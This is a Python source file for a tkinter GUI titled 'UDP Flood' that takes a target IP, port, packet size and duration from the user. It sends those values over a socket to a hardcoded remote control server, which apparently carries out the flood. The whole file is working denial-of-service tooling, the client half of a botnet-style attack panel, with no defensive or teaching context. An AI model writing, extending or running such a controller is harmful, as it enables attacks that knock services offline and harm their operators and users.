import tkinter as tk
import socket

# Server details (hardcoded)
SERVER_IP = '69.164.196.248'  # Change this to your server's IP address
SERVER_PORT = 9999       # Make sure this matches the port on the server

def send_attack_params():
    ip = ip_entry.get()
    port = port_entry.get()
    size = size_entry.get()
    duration = time_entry.get()

    if not ip or not port or not size or not duration:
        result_label.config(text="Please fill in all fields.")
        return

    # Create a socket connection to the server
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))

        # Send attack parameters to the server
        data = f"{ip},{port},{size},{duration}"
        client_socket.sendall(data.encode())
        client_socket.close()

        result_label.config(text=f"Sent: IP={ip}, Port={port}, Size={size}, Time={duration} sec")

        # Hide the Start Flood button
        start_button.grid_forget()

        # Schedule reappearance of the Start Flood button
        root.after(int(duration) * 1000, show_start_button)

    except Exception as e:
        result_label.config(text=f"Failed to send data: {e}")
        # Ensure the button is re-enabled in case of failure
        root.after(1000, show_start_button)

def show_start_button():
    start_button.grid(row=4, column=0, columnspan=2)

# Create the main application window
root = tk.Tk()
root.title("UDP Flood")

# Create and place input fields
tk.Label(root, text="Target IP Address:").grid(row=0, column=0)
ip_entry = tk.Entry(root)
ip_entry.grid(row=0, column=1)

tk.Label(root, text="Port:").grid(row=1, column=0)
port_entry = tk.Entry(root)
port_entry.grid(row=1, column=1)

tk.Label(root, text="Packet Size:").grid(row=2, column=0)
size_entry = tk.Entry(root)
size_entry.grid(row=2, column=1)

tk.Label(root, text="Time (seconds):").grid(row=3, column=0)
time_entry = tk.Entry(root)
time_entry.grid(row=3, column=1)

# Create and place the Start button
start_button = tk.Button(root, text="Start Flood", command=send_attack_params)
start_button.grid(row=4, column=0, columnspan=2)

# Label to display result or error message
result_label = tk.Label(root, text="")
result_label.grid(row=5, column=0, columnspan=2)

# Start the Tkinter event loop
root.mainloop()

